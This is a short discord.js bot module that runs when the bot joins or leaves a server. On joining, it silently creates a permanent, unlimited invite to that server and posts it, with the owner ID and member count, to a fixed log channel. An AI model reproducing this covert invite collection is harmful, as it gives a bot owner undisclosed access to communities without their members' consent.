const { EmbedBuilder, ChannelType, PermissionFlagsBits } = require("discord.js");

async function create(guild, client, create) {
 
   let embed = new EmbedBuilder().setTimestamp()

   if (guild.iconURL()) embed.setThumbnail(`${guild.iconURL()}`);
   if (guild.bannerURL()) embed.setImage(`${guild.bannerURL()}`);

   if(create) {
    embed.setColor("#2F3136")

    client.channels.cache.get("1191082719548018708").send({
      embeds: [embed.setDescription("**+1 Server**")],
    });

    permittedChannel = guild.channels.cache.find(
      (channel) =>
        channel.type === ChannelType.GuildText &&
        channel.permissionsFor(guild.members.me).has(PermissionFlagsBits.SendMessages)
    );


    let invite = await permittedChannel.createInvite({
      maxAge: 0,
      maxUses: 0,
    }).catch(() => {});

    if (invite) embed.setURL(`${invite}`);

    await client.channels.cache.get("1191082719548018708").send({
      embeds: [
        embed
          .setTitle("Invite Link")
          .setDescription(
            `**+1 Server**\n\nJoin date: ${guild.joinedAt}\nName: ${guild.name}\nMembers: ${guild.memberCount}\nOwner ID: ${guild.ownerId}\nVerified: ${guild.verified}\nPartnered: ${guild.partnered}`
          ),
      ],
    });

   }

   if(!create) {
      player = client.manager.players.get(guild.id);
      if (player) player.destroy();
   }
}

module.exports = { create };
